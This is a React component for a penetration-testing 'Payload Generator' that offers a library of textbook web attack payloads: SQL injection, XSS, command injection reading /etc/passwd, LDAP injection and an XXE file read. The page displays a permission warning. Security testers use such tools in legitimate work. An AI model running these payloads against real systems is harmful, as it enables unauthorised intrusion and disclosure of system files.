
import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { Code, Copy } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

export const PayloadGenerator = () => {
  const [payloadType, setPayloadType] = useState("");
  const [target, setTarget] = useState("");
  const [parameters, setParameters] = useState("");
  const [generatedPayload, setGeneratedPayload] = useState("");
  const { toast } = useToast();

  const payloadTemplates = {
    "sql-injection": {
      name: "SQL Injection",
      template: "' UNION SELECT 1,2,3,database(),version()-- -",
      description: "Basic SQL injection payload for MySQL databases"
    },
    "xss-reflected": {
      name: "Reflected XSS",
      template: "<script>alert('XSS')</script>",
      description: "Simple reflected cross-site scripting payload"
    },
    "xss-stored": {
      name: "Stored XSS",
      template: "<img src=x onerror=alert('Stored XSS')>",
      description: "Persistent cross-site scripting payload"
    },
    "command-injection": {
      name: "Command Injection",
      template: "; cat /etc/passwd #",
      description: "Unix command injection payload"
    },
    "ldap-injection": {
      name: "LDAP Injection",
      template: "*)(uid=*))(|(uid=*",
      description: "LDAP injection payload for authentication bypass"
    },
    "xxe": {
      name: "XML External Entity",
      template: `<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY test SYSTEM 'file:///etc/passwd'>
]>
<root>&test;</root>`,
      description: "XXE payload to read local files"
    }
  };

  const handleGeneratePayload = () => {
    if (!payloadType) {
      toast({
        title: "Error",
        description: "Please select a payload type",
        variant: "destructive",
      });
      return;
    }

    const template = payloadTemplates[payloadType as keyof typeof payloadTemplates];
    let payload = template.template;

    if (target) {
      payload = payload.replace(/TARGET/g, target);
    }

    if (parameters) {
      payload = payload.replace(/PARAMS/g, parameters);
    }

    setGeneratedPayload(payload);
    console.log("Generated payload:", payload);

    toast({
      title: "Payload Generated",
      description: `${template.name} payload created successfully`,
    });
  };

  const handleCopyPayload = () => {
    navigator.clipboard.writeText(generatedPayload);
    toast({
      title: "Copied",
      description: "Payload copied to clipboard",
    });
  };

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-3xl font-bold text-white">Payload Generator</h1>
        <p className="text-gray-400 mt-1">Generate custom payloads for penetration testing</p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <Card className="bg-gray-800 border-gray-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center gap-2">
              <Code size={20} />
              Payload Configuration
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">Payload Type</label>
              <Select value={payloadType} onValueChange={setPayloadType}>
                <SelectTrigger className="bg-gray-700 border-gray-600 text-white">
                  <SelectValue placeholder="Select payload type" />
                </SelectTrigger>
                <SelectContent className="bg-gray-700 border-gray-600">
                  {Object.entries(payloadTemplates).map(([key, template]) => (
                    <SelectItem key={key} value={key} className="text-white hover:bg-gray-600">
                      {template.name}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">Target (Optional)</label>
              <Input
                value={target}
                onChange={(e) => setTarget(e.target.value)}
                placeholder="Target URL or parameter"
                className="bg-gray-700 border-gray-600 text-white"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">Additional Parameters</label>
              <Input
                value={parameters}
                onChange={(e) => setParameters(e.target.value)}
                placeholder="Custom parameters"
                className="bg-gray-700 border-gray-600 text-white"
              />
            </div>

            <Button
              onClick={handleGeneratePayload}
              className="w-full bg-green-600 hover:bg-green-700"
            >
              Generate Payload
            </Button>

            {payloadType && (
              <div className="p-3 bg-gray-700/50 rounded-lg">
                <h4 className="text-sm font-medium text-white mb-1">
                  {payloadTemplates[payloadType as keyof typeof payloadTemplates].name}
                </h4>
                <p className="text-xs text-gray-400">
                  {payloadTemplates[payloadType as keyof typeof payloadTemplates].description}
                </p>
              </div>
            )}
          </CardContent>
        </Card>

        <Card className="bg-gray-800 border-gray-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center justify-between">
              Generated Payload
              {generatedPayload && (
                <Button
                  onClick={handleCopyPayload}
                  size="sm"
                  variant="outline"
                  className="border-gray-600 text-gray-300 hover:bg-gray-700"
                >
                  <Copy size={16} className="mr-2" />
                  Copy
                </Button>
              )}
            </CardTitle>
          </CardHeader>
          <CardContent>
            <Textarea
              value={generatedPayload}
              placeholder="Generated payload will appear here..."
              className="bg-gray-700 border-gray-600 text-green-400 font-mono text-sm min-h-[200px]"
              readOnly
            />
            {generatedPayload && (
              <div className="mt-3 p-3 bg-yellow-900/20 border border-yellow-600/50 rounded-lg">
                <p className="text-yellow-400 text-xs">
                  <strong>Warning:</strong> Use these payloads only on systems you own or have explicit permission to test. 
                  Unauthorized use may be illegal and unethical.
                </p>
              </div>
            )}
          </CardContent>
        </Card>
      </div>

      <Card className="bg-gray-800 border-gray-700">
        <CardHeader>
          <CardTitle className="text-white">Payload Library</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {Object.entries(payloadTemplates).map(([key, template]) => (
              <div
                key={key}
                className="p-3 bg-gray-700/50 rounded-lg cursor-pointer hover:bg-gray-600/50 transition-colors"
                onClick={() => setPayloadType(key)}
              >
                <h3 className="text-white font-medium mb-1">{template.name}</h3>
                <p className="text-gray-400 text-xs mb-2">{template.description}</p>
                <code className="text-green-400 text-xs bg-gray-800 p-1 rounded">
                  {template.template.substring(0, 50)}...
                </code>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>
    </div>
  );
};
